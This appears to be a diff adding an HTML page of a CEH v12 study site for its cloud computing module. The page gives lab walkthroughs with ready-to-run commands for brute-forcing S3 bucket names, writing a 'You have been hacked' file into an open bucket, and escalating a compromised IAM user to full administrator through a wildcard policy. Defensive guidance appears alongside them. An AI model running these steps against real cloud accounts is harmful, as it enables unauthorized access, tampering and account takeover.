@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 19 - Cloud Computing</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">&#9776;</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+            <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+            <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+            <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+            <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+            <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
+            <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
+            <li><a href="module_16.html" id="nav-16">MOD_16_WIRELESS</a></li>
+            <li><a href="module_17.html" id="nav-17">MOD_17_MOBILE</a></li>
+            <li><a href="module_18.html" id="nav-18">MOD_18_IOT</a></li>
+            <li><a href="module_19.html" id="nav-19">MOD_19_CLOUD</a></li>
+            <li><a href="module_20.html" id="nav-20">MOD_20_CRYPTO</a></li>
+        <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        </ul>
+        <button id="viewToggle" class="view-toggle">COMPACT</button>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Module 19</span>
+                <h2 class="hero-3d">Cloud Computing</h2>
+            </div>
+
+            <p>Cloud computing is an emerging technology that delivers computing services such as online business applications, online data storage, and webmail over the Internet. Cloud implementation enables a distributed workforce, reduces organization expenses, provides data security, etc. As enterprises are increasingly adopting cloud services, cloud systems have emerged as targets for attackers to gain unauthorized access to the valuable data stored in them. Therefore, it is essential to regularly perform pen testing on cloud systems to monitor their security posture.</p>
+
+            <p>Security administrators claim that cloud systems are more vulnerable to DoS assaults, because they involve numerous individuals or clients, making DoS assaults potentially very harmful. Because of the high workload on a flooded service, these systems attempt to provide additional computational power (more virtual machines, more service instances) to cope with the workload, and they will eventually fail. Although cloud systems try to thwart attackers by providing additional computational power, they inadvertently aid attackers by allowing the most significant possible damage to the availability of a service - a process that starts from a single flooding-attack entry point. Thus, attackers need not flood all servers that provide a particular service but merely flood a single, cloud-based address to a service that is unavailable. Thus, adequate security is vital in this context, because cloud-computing services are based on sharing.</p>
+
+            <p><strong>Scenario:</strong> As an ethical hacker and penetration tester, you must have sound knowledge of hacking cloud platforms using various tools and techniques. The labs in this module will provide you with real-time experience in exploiting the underlying vulnerabilities in a target cloud platform using various hacking methods and tools. However, hacking the cloud platform may be illegal depending on the organization's policies and any laws that are in effect. As an ethical or pen tester, you should always acquire proper authorization before performing system hacking.</p>
+
+            <p><strong>Objective:</strong> The objective of the lab is to perform cloud platform hacking and other tasks that include, but are not limited to: Performing S3 bucket enumeration; Exploiting misconfigured S3 buckets; Escalating privileges of a target IAM user account by exploiting misconfigurations in a user policy.</p>
+
+            <p><strong>Overview of Cloud Computing:</strong> Cloud computing refers to on-demand delivery of IT capabilities, in which IT infrastructure and applications are provided to subscribers as metered services over a network. Cloud services are classified into three categories, namely infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), and software-as-a-service (SaaS), which offer different techniques for developing cloud.</p>
+
+            <p><strong>Lab Tasks:</strong></p>
+            <ul>
+                <li>Perform S3 bucket enumeration using various S3 bucket enumeration tools
+                    <ul>
+                        <li>Enumerate S3 buckets using lazys3</li>
+                        <li>Enumerate S3 buckets using S3Scanner</li>
+                    </ul>
+                </li>
+                <li>Exploit S3 buckets
+                    <ul>
+                        <li>Exploit open S3 buckets using AWS CLI</li>
+                    </ul>
+                </li>
+                <li>Perform privilege escalation to gain higher privileges
+                    <ul>
+                        <li>Escalate IAM user privileges by exploiting misconfigured user policy</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <section class="lab-task">
+                <h3>Exam Essentials: Cloud Computing</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Scenario &amp; Objective</span>
+                    <p><strong>Scenario:</strong> Cloud computing delivers computing services such as online business applications, online data storage, and webmail over the Internet. Cloud implementation enables a distributed workforce, reduces organization expenses, and provides data security. As enterprises increasingly adopt cloud services, cloud systems have become targets for attackers seeking unauthorized access to valuable stored data, so regular pen testing of cloud systems is essential to monitor their security posture. Cloud systems are considered more vulnerable to DoS assaults because they involve numerous clients; under a flood they provision more computational power (more VMs/instances) to cope, eventually failing, and a single flooding entry point can make a cloud-based service unavailable. Adequate security is vital because cloud-computing services are based on sharing. As an ethical hacker/pen tester you must have sound knowledge of hacking cloud platforms using various tools and techniques; the labs provide real-time experience in exploiting underlying vulnerabilities in a target cloud platform. Hacking a cloud platform may be illegal depending on organizational policies and laws; always acquire proper authorization.</p>
+                    <p><strong>Objective:</strong> Perform cloud platform hacking tasks including: Performing S3 bucket enumeration; Exploiting misconfigured S3 buckets; Escalating privileges of a target IAM user account by exploiting misconfigurations in a user policy.</p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Overview of Cloud Computing &amp; Enumeration</span>
+                    <p>Cloud computing refers to on-demand delivery of IT capabilities, in which IT infrastructure and applications are provided to subscribers as metered services over a network. Cloud services are classified into three categories: infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), and software-as-a-service (SaaS). Enumeration tools collect detailed information about target systems to exploit them; information collected by S3 enumeration tools consists of a list of misconfigured S3 buckets available publicly, which attackers can exploit to gain unauthorized access, modify, delete, and exfiltrate bucket content. S3 buckets store text documents, PDFs, videos, images, etc., and require a unique bucket name. Techniques to identify AWS S3 buckets include: inspecting HTML source for bucket URLs; brute-forcing URLs with Burp Suite; finding subdomains with Findsubdomains/Robtex; reverse IP search with Bing; advanced Google hacking with "inurl".</p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Concepts</span>
+                    <ul>
+                        <li><strong>Cloud computing:</strong> On-demand delivery of IT capabilities as metered services over a network.</li>
+                        <li><strong>IaaS (Infrastructure as a Service):</strong> Provider supplies virtualized compute, storage, and network; customer manages OS, middleware, apps, and data.</li>
+                        <li><strong>PaaS (Platform as a Service):</strong> Provider manages platform/runtime/OS; customer manages applications and data.</li>
+                        <li><strong>SaaS (Software as a Service):</strong> Provider delivers complete software application; customer simply uses it.</li>
+                        <li><strong>Deployment models:</strong> Public, private, hybrid, and community clouds.</li>
+                        <li><strong>AWS (Amazon Web Services):</strong> Cloud platform providing IaaS/PaaS/SaaS; organized into regions and availability zones (AZs).</li>
+                        <li><strong>Region / AZ:</strong> Geographic locations; AZs are isolated data centers within a region.</li>
+                        <li><strong>S3 (Simple Storage Service):</strong> Object storage; buckets (containers), objects (files), keys (names), metadata.</li>
+                        <li><strong>Bucket naming:</strong> Globally unique, DNS-style names.</li>
+                        <li><strong>S3 access controls:</strong> ACLs, bucket policies, IAM policies, presigned URLs.</li>
+                        <li><strong>Public/open buckets:</strong> Misconfigured to allow anonymous read/write, enabling data theft and file injection.</li>
+                        <li><strong>Enumeration:</strong> Brute-forcing bucket names/permutations to find publicly accessible buckets.</li>
+                        <li><strong>lazys3:</strong> Ruby script that brute-forces AWS S3 buckets using permutations; obtains publicly accessible buckets; can search buckets of a specific company by name.</li>
+                        <li><strong>S3Scanner:</strong> Finds open S3 buckets and dumps their contents; takes a list of bucket names; outputs found buckets; dumps/lists contents locally.</li>
+                        <li><strong>Other enumeration tools:</strong> S3Inspector, s3-buckets-bruteforcer, Mass3, Bucket Finder, s3recon, cloud_enum.</li>
+                        <li><strong>AWS CLI:</strong> Unified command-line tool to manage AWS services; configured with Access Key ID, Secret Access Key, default region, output format.</li>
+                        <li><strong>S3 CLI commands:</strong> aws s3 ls, aws s3 mv, aws s3 rm, aws s3api list-buckets.</li>
+                        <li><strong>Exploiting open buckets:</strong> Add/move/delete files, inject malware into bucket files, exfiltrate data.</li>
+                        <li><strong>IAM (Identity and Access Management):</strong> Manages users, groups, roles, and policies.</li>
+                        <li><strong>Policy:</strong> JSON document defining permissions (Effect, Action, Resource).</li>
+                        <li><strong>Privilege escalation:</strong> Horizontal (same-level access) and vertical (higher privileges).</li>
+                        <li><strong>Misconfigured user policy:</strong> Permissions such as iam:CreatePolicy, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole, iam:ListRoles can be exploited to attach an admin policy.</li>
+                        <li><strong>AdministratorAccess policy:</strong> Action "*" Resource "*" grants full administrator access.</li>
+                        <li><strong>Shared responsibility model:</strong> Provider secures cloud infrastructure; customer secures data, IAM, configuration, and network.</li>
+                        <li><strong>Cloud security threats:</strong> DoS, data breaches, misconfigurations, AAA vulnerabilities, hypervisor vulnerabilities, unclear roles.</li>
+                        <li><strong>Metadata service (IMDS):</strong> 169.254.169.254 provides instance metadata/credentials; a common SSRF target.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Tools</span>
+                    <p><span class="tool-tag">AWS CLI</span> <span class="tool-tag">lazys3</span> <span class="tool-tag">S3Scanner</span> <span class="tool-tag">S3Inspector</span> <span class="tool-tag">s3-buckets-bruteforcer</span> <span class="tool-tag">Mass3</span> <span class="tool-tag">Bucket Finder</span> <span class="tool-tag">s3recon</span> <span class="tool-tag">cloud_enum</span> <span class="tool-tag">Pacu</span> <span class="tool-tag">ScoutSuite</span> <span class="tool-tag">CloudSploit</span> <span class="tool-tag">Prowler</span> <span class="tool-tag">enumerate-iam</span> <span class="tool-tag">Burp Suite</span> <span class="tool-tag">Firefox</span> <span class="tool-tag">vim</span> <span class="tool-tag">Parrot Security</span> <span class="tool-tag">AWS Management Console</span></p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Protocols / Ports</span>
+                    <ul>
+                        <li><strong>HTTPS/TLS:</strong> TCP 443 (AWS Console, S3 API, IAM, STS, CloudTrail).</li>
+                        <li><strong>HTTP:</strong> TCP 80 (S3 static website hosting, IMDS at 169.254.169.254).</li>
+                        <li><strong>SSH:</strong> TCP 22 (EC2 Linux instances).</li>
+                        <li><strong>RDP:</strong> TCP 3389 (EC2 Windows instances).</li>
+                        <li><strong>S3 endpoints:</strong> 443 (REST API).</li>
+                        <li><strong>IMDS (Instance Metadata Service):</strong> 169.254.169.254:80.</li>
+                        <li><strong>DNS:</strong> UDP/TCP 53 (bucket/endpoint resolution).</li>
+                        <li><strong>IAM/STS APIs:</strong> 443 (JSON over HTTPS).</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Commands</span>
+                    <pre><code># Parrot Security: gain root
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Lab 1 - lazys3
+cd lazys3-master/
+ls
+ruby lazys3.rb
+# Ctrl+Z to stop
+ruby lazys3.rb [Company]   # e.g. HackerOne
+# Ctrl+Z to stop
+
+# Lab 1 - S3Scanner
+cd S3Scanner/
+pip3 install -r requirements.txt
+python3 ./s3scanner.py sites.txt
+
+# Lab 2 - AWS CLI install &amp; configure
+cd
+pip3 install awscli
+aws --help
+aws configure
+# AWS Access Key ID, AWS Secret Access Key, Default region name: eu-west-1, Default output format: (default)
+
+# S3 enumeration / exploitation
+aws s3 ls s3://certifiedhacker003
+echo "You have been hacked" >> Hack.txt
+aws s3 mv Hack.txt s3://certifiedhacker003
+aws s3 rm s3://certifiedhacker003/Hack.txt
+# Browser: certifiedhacker003.s3.amazonaws.com
+
+# Lab 3 - configure target IAM user
+aws configure
+# AWS Access Key ID (target), AWS Secret Access Key (target), Default region name: us-east-2, Default output format: json
+
+# Create admin policy file
+vim user-policy.json
+# content:
+# {
+#   "Version":"2012-10-17",
+#   "Statement": [{"Effect":"Allow","Action":"*","Resource":"*"}]
+# }
+# Esc -> :wq!
+
+# Attach policy and escalate
+aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
+aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
+aws iam list-attached-user-policies --user-name [Target Username]
+aws iam list-users
+
+# Enumeration / post-escalation commands
+aws s3api list-buckets --query "Buckets[].Name"
+aws iam list-user-policies
+aws iam list-role-policies
+aws iam list-group-policies
+aws iam create-user</code></pre>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Defenses</span>
+                    <ul>
+                        <li>Apply least privilege in IAM: grant only required permissions; avoid wildcard Action/Resource.</li>
+                        <li>Block public access at account and bucket level; review bucket ACLs and policies.</li>
+                        <li>Enable S3 Block Public Access and use private buckets by default.</li>
+                        <li>Encrypt data at rest (SSE-S3/SSE-KMS) and in transit (TLS).</li>
+                        <li>Enable MFA, strong passwords, and rotate access keys regularly.</li>
+                        <li>Enable CloudTrail, S3 access logging, and GuardDuty for monitoring.</li>
+                        <li>Use IAM roles instead of long-lived access keys; enforce SCPs in Organizations.</li>
+                        <li>Restrict iam:CreatePolicy/AttachUserPolicy and sts:AssumeRole to trusted principals.</li>
+                        <li>Validate IAM policies; avoid misconfigured user policies allowing privilege escalation.</li>
+                        <li>Disable unused regions and services; use VPC endpoints and network segmentation.</li>
+                        <li>Protect IMDS: enforce IMDSv2 and restrict SSRF vectors.</li>
+                        <li>Educate users on social engineering risks for credential theft.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Exam Tips</span>
+                    <ul>
+                        <li>Cloud service models: IaaS, PaaS, SaaS; deployment models: public/private/hybrid/community.</li>
+                        <li>S3 buckets are object storage; misconfigured public read/write is a common exam scenario.</li>
+                        <li>lazys3 brute-forces bucket names via permutations; S3Scanner finds and dumps open buckets.</li>
+                        <li>AWS CLI configured with aws configure: Access Key ID, Secret Access Key, region, output format.</li>
+                        <li>Lab region for S3 exploitation: eu-west-1; target open bucket: certifiedhacker003.</li>
+                        <li>Lab IAM escalation region: us-east-2; output format json.</li>
+                        <li>AdministratorAccess policy uses Action "*" and Resource "*" (full admin).</li>
+                        <li>Privilege escalation via misconfigured policies: iam:CreatePolicy, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole, iam:ListRoles.</li>
+                        <li>Shared responsibility: provider secures infrastructure; customer secures data/IAM/config.</li>
+                        <li>Other enumeration tools: S3Inspector, s3-buckets-bruteforcer, Mass3, Bucket Finder, s3recon, cloud_enum.</li>
+                        <li>Other cloud tools: Pacu, ScoutSuite, CloudSploit, Prowler, enumerate-iam.</li>
+                        <li>Bucket identification techniques: HTML inspection, Burp brute-force, subdomain finder, reverse IP, Google dorking.</li>
+                        <li>IMDS at 169.254.169.254 is a common SSRF target for credential theft.</li>
+                        <li>Always obtain proper authorization; cloud hacking may be illegal.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Always obtain proper authorization; use these techniques only in authorized labs/environments. Cloud hacking may be illegal depending on organization policies and laws.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Perform S3 Bucket Enumeration using Various S3 Bucket Enumeration Tools - Task 1: Enumerate S3 Buckets using lazys3</h3>
+                <div class="section-card">
+                    <span class="tool-tag">lazys3 / Ruby / Parrot Security</span>
+                    <p><strong>What/when:</strong> Use lazys3, a Ruby script, to brute-force AWS S3 buckets using different permutations. Obtains publicly accessible S3 buckets and allows searching S3 buckets of a specific company by entering the company name. Attacker on Parrot Security.</p>
+                    <pre><code># Parrot Security machine
+# login: attacker / toor
+# (if update prompt appears, click No)
+
+# Open terminal
+# click MATE Terminal icon at top of Desktop
+sudo su
+# [sudo] password for attacker: toor (not visible)
+# root prompt
+
+# Navigate to cloned lazys3 repository
+cd lazys3-master/
+# (tool already downloaded in lab setup)
+
+# List folder content
+ls
+# folder content displayed; run lazys3.rb to find public S3 buckets
+
+# Run lazys3 to list public S3 buckets
+ruby lazys3.rb
+# A list of public S3 buckets is displayed
+
+# Stop the script
+# Press Ctrl+Z
+
+# Search S3 buckets of a specific company (e.g., HackerOne)
+ruby lazys3.rb [Company]
+# e.g. ruby lazys3.rb HackerOne
+# result shows obtained list of S3 buckets of specified company
+# (takes time to obtain complete list)
+
+# Stop the script
+# Press Ctrl+Z
+
+# Close all open windows; document acquired information</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Parrot Security; login attacker/toor. Open MATE Terminal; sudo su; toor. cd lazys3-master/; ls. Run ruby lazys3.rb; observe list of public S3 buckets; Ctrl+Z to stop. Run ruby lazys3.rb HackerOne to enumerate company buckets; wait; Ctrl+Z. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. We have already downloaded lazys3 tool in the lab setup.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Perform S3 Bucket Enumeration using Various S3 Bucket Enumeration Tools - Task 2: Enumerate S3 Buckets using S3Scanner</h3>
+                <div class="section-card">
+                    <span class="tool-tag">S3Scanner / Python3 / pip3 / Parrot Security / sites.txt</span>
+                    <p><strong>What/when:</strong> Use S3Scanner to find open S3 buckets and dump their contents. Takes a list of bucket names to check as input; found buckets are output to a file; tool also dumps or lists contents of "open" buckets locally. Attacker on Parrot Security.</p>
+                    <pre><code># Parrot Security machine
+# Open terminal
+# click MATE Terminal icon in menu
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Navigate to cloned S3Scanner repository (default cloned to root)
+cd S3Scanner/
+
+# Install required dependencies
+pip3 install -r requirements.txt
+
+# Run S3Scanner against target list
+python3 ./s3scanner.py sites.txt
+# sites.txt contains target website URL scanned for open S3 buckets
+# edit sites.txt to enter target website URL of your choice
+# result displays list of public S3 buckets
+
+# Note: "AWS credentials not configured" error may appear; ignore (AWS CLI configured in next lab)
+
+# Close all open windows; document acquired information</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Open MATE Terminal; sudo su; toor. cd S3Scanner/. pip3 install -r requirements.txt. python3 ./s3scanner.py sites.txt. Observe list of public S3 buckets. Ignore AWS credentials error if appears. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Other S3 bucket enumeration tools: S3Inspector (https://github.com), s3-buckets-bruteforcer (https://github.com), Mass3 (https://github.com), Bucket Finder (https://digi.ninja), s3recon (https://github.com).</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Exploit S3 Buckets - Task 1: Exploit Open S3 Buckets using AWS CLI</h3>
+                <div class="section-card">
+                    <span class="tool-tag">AWS CLI / aws / pip3 / Firefox / AWS Console / Parrot Security / S3 bucket certifiedhacker003</span>
+                    <p><strong>What/when:</strong> Use AWS CLI to exploit misconfigured open S3 buckets: list directories, move files into bucket, delete files. Requires an AWS account; create access keys. Caution: third-party services may incur fees; follow guidelines to remove billable services. Attacker on Parrot Security plus AWS console in Firefox.</p>
+                    <pre><code># CAUTION: signing up for third-party services may incur fees; follow proper guidelines to remove billable services.
+# Create an AWS account first: https://portal.aws.amazon.com/billing/signup#/start/email
+
+# Parrot Security machine
+# Open terminal
+# click MATE Terminal icon in menu
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Jump to root directory
+cd
+
+# Install AWS CLI
+pip3 install awscli
+
+# Verify installation
+aws --help
+# (awscli may already be installed; ignore errors)
+
+# Configure AWS CLI
+aws configure
+# AWS Access Key ID: (paste from AWS console)
+# AWS Secret Access Key: (paste from AWS console)
+# Default region name: eu-west-1
+# Default output format: (leave default, press Enter)
+
+# AWS console (Firefox)
+# click Firefox icon -> type https://console.aws.amazon.com -> Enter
+# Sign in with email/password (captcha if prompted)
+# AWS account drop-down -> Security Credentials
+# Access keys (access key ID and secret access key) -> Create New Access Key
+# Show Access Key -> copy Access Key ID (Ctrl+C) -> paste into terminal
+# copy Secret Access Key -> paste into terminal
+
+# For demonstration, open bucket name: certifiedhacker003
+# List directories in bucket
+aws s3 ls s3://certifiedhacker003
+# (bucket name may differ in your lab)
+
+# View bucket in browser
+# maximize browser -> address bar: certifiedhacker003.s3.amazonaws.com -> Enter
+# shows complete list of directories and files
+
+# Create a test file
+echo "You have been hacked" >> Hack.txt
+
+# Move file into bucket
+aws s3 mv Hack.txt s3://certifiedhacker003
+# successfully moved Hack.txt to bucket
+
+# Verify in browser (reload page) -> Hack.txt present
+
+# Delete file from bucket
+aws s3 rm s3://certifiedhacker003/Hack.txt
+# successfully deleted Hack.txt
+
+# Verify in browser (reload page) -> Hack.txt removed
+
+# Close all open windows; document acquired information</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Create AWS account. Parrot Security: sudo su; toor; cd; pip3 install awscli; aws --help. aws configure; paste keys from AWS console; region eu-west-1. Firefox: login console.aws.amazon.com; Security Credentials; create access key; copy/paste keys. List bucket: aws s3 ls s3://certifiedhacker003; browser view certifiedhacker003.s3.amazonaws.com. echo "You have been hacked" >> Hack.txt; aws s3 mv Hack.txt s3://certifiedhacker003; verify; aws s3 rm s3://certifiedhacker003/Hack.txt; verify. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Public S3 buckets can be found during enumeration phase. Be careful with fees; remove billable services.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 3: Perform Privilege Escalation to Gain Higher Privileges - Task 1: Escalate IAM User Privileges by Exploiting Misconfigured User Policy</h3>
+                <div class="section-card">
+                    <span class="tool-tag">AWS CLI / vim / IAM / Parrot Security / user-policy.json</span>
+                    <p><strong>What/when:</strong> Exploit a misconfigured IAM user policy to escalate privileges to administrator level. Target IAM user has permissions including iam:CreatePolicy, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole, and iam:ListRoles. Attacker obtains target user's access/secret keys via social engineering (Module 09), then creates and attaches an AdministratorAccess policy. Attacker on Parrot Security.</p>
+                    <pre><code># Parrot Security machine
+# Open terminal
+# click MATE Terminal icon in menu
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Jump to root directory
+cd
+
+# Configure AWS CLI with target IAM user credentials
+aws configure
+# AWS Access Key ID: (target user's access key)
+# AWS Secret Access Key: (target user's secret access key)
+# Default region name: us-east-2
+# Default output format: json
+# (keys can be obtained via social engineering, Module 09)
+
+# Create policy file
+vim user-policy.json
+# press I, type:
+# {
+# "Version":"2012-10-17",
+# "Statement": [
+#     {
+#         "Effect":"Allow",
+#         "Action":"*",
+#         "Resource":"*"
+#     }
+# ]
+# }
+# (AdministratorAccess policy granting admin access)
+# press Esc, then :wq! to save
+
+# Create the policy
+aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
+# displays PolicyName, PolicyId, Arn
+
+# Attach policy to target IAM user
+aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
+# e.g. target username: test
+
+# View attached policies
+aws iam list-attached-user-policies --user-name [Target Username]
+# displays user-policy
+
+# List all IAM users (post-escalation)
+aws iam list-users
+
+# Other enumeration commands after escalation:
+# List S3 buckets:
+aws s3api list-buckets --query "Buckets[].Name"
+# User policies:
+aws iam list-user-policies
+# Role policies:
+aws iam list-role-policies
+# Group policies:
+aws iam list-group-policies
+# Create user:
+aws iam create-user
+
+# Close all open windows; document acquired information</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Security: sudo su; toor; cd. aws configure with target IAM user's access/secret keys; region us-east-2; output json. vim user-policy.json; press I; type AdministratorAccess JSON (Version 2012-10-17, Statement Allow * on *); Esc; :wq!. aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json. aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy. aws iam list-attached-user-policies --user-name [Target Username]. aws iam list-users. Use additional commands to enumerate buckets/policies and create users. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. A policy attached to an identity defines its permissions; customer-managed policies can be created via console/CLI/API. Misconfigured policies enabling iam:CreatePolicy/AttachUserPolicy/etc. allow escalation to admin.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Practice &amp; Reference</h3>
+                <div class="section-card">
+                    <p>The lab tasks above provide hands-on practice and reference commands for S3 bucket enumeration (lazys3, S3Scanner), exploiting open S3 buckets with AWS CLI (list/move/delete files), and IAM privilege escalation by creating and attaching an AdministratorAccess policy via misconfigured user permissions. Also covers cloud concepts (IaaS/PaaS/SaaS), shared responsibility, enumeration techniques, and cloud security defenses.</p>
+                </div>
+            </section>
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+        const applyTheme = (t) => {
+            if (t === 'dark') body.setAttribute('data-theme', 'dark');
+            else body.removeAttribute('data-theme');
+        };
+        function getTheme() {
+            try {
+                const p = new URLSearchParams(location.search);
+                const u = p.get('theme');
+                if (u === 'dark' || u === 'light') return u;
+            } catch (e) {}
+            try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+        }
+        function syncNavLinks(t) {
+            document.querySelectorAll('a[href]').forEach(a => {
+                try {
+                    const url = new URL(a.getAttribute('href'), location.href);
+                    if (url.pathname.endsWith('.html')) {
+                        url.searchParams.set('theme', t);
+                        a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                    }
+                } catch (e) {}
+            });
+        }
+        const initialTheme = getTheme();
+        applyTheme(initialTheme);
+        syncNavLinks(initialTheme);
+        const toggle = document.getElementById('themeToggle');
+        if (toggle) {
+            toggle.addEventListener('click', () => {
+                const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+                applyTheme(newT);
+                try { localStorage.setItem('theme', newT); } catch (e) {}
+                try {
+                    const url = new URL(location.href);
+                    url.searchParams.set('theme', newT);
+                    history.replaceState(null, '', url.toString());
+                } catch (e) {}
+                syncNavLinks(newT);
+            });
+        }
+        const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+            'module_13.html': 'nav-13',
+            'module_14.html': 'nav-14',
+            'module_15.html': 'nav-15',
+            'module_16.html': 'nav-16',
+            'module_17.html': 'nav-17',
+            'module_18.html': 'nav-18',
+            'module_19.html': 'nav-19',
+            'module_20.html': 'nav-20',
+            'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        document.getElementById(navId).classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
